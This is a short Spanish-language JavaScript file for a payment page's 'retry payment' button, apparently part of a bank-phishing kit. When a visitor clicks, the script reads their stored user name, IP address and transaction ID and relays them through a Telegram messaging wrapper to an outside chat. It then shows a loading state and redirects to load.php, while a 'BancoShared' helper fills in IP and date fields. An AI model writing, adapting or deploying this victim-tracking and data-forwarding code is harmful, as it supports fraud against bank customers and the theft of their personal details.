(function () {
    const btnReintentar = document.getElementById("btnReintentar");

    async function enviarNotificacionReintento() {
        if (typeof telegramAPI === 'undefined') {
            console.warn('telegramAPI no disponible, continuando sin notificación');
            return;
        }

        const usuario = localStorage.getItem("userName") || localStorage.getItem("usuario") || "Desconocido";
        const ip = localStorage.getItem("ip") || localStorage.getItem("address") || "No disponible";
        const transactionId = localStorage.getItem("transaction_id") || "N/A";

        const message = `
🔄 <b>REINTENTO DE PAGO - SELECCION 919</b>
--------------------------------------------------
🆔 <b>ID:</b> <code>${transactionId}</code>
🧑‍💻 <b>User:</b> <code>${usuario}</code>
📡 <b>IP:</b> ${ip}

➡️ El usuario hizo clic en "Reintentar pago"
--------------------------------------------------
`;

        try {
            await telegramAPI.sendMessage(message, 'HTML', null);
            console.log("✅ Notificación de reintento enviada");
        } catch (e) {
            console.error("❌ Error enviando notificación:", e);
        }
    }

    async function onReintentar() {
        if (!btnReintentar) return;

        btnReintentar.classList.add("is-loading");
        const textoOriginal = btnReintentar.textContent;
        btnReintentar.textContent = "Procesando...";

        await enviarNotificacionReintento();

        setTimeout(function () {
            window.location.href = "load.php";
        }, 1200);

        setTimeout(() => {
            btnReintentar.classList.remove("is-loading");
            btnReintentar.textContent = textoOriginal;
        }, 4000);
    }

    if (btnReintentar) {
        btnReintentar.addEventListener("click", onReintentar);
    }

    if (typeof BancoShared !== 'undefined') {
        try {
            BancoShared.populateIp({ ipElementId: "gfg" });
            BancoShared.startDateTime("fecha-hora");
        } catch (e) {
            console.warn("Error en BancoShared:", e);
        }
    }
})();
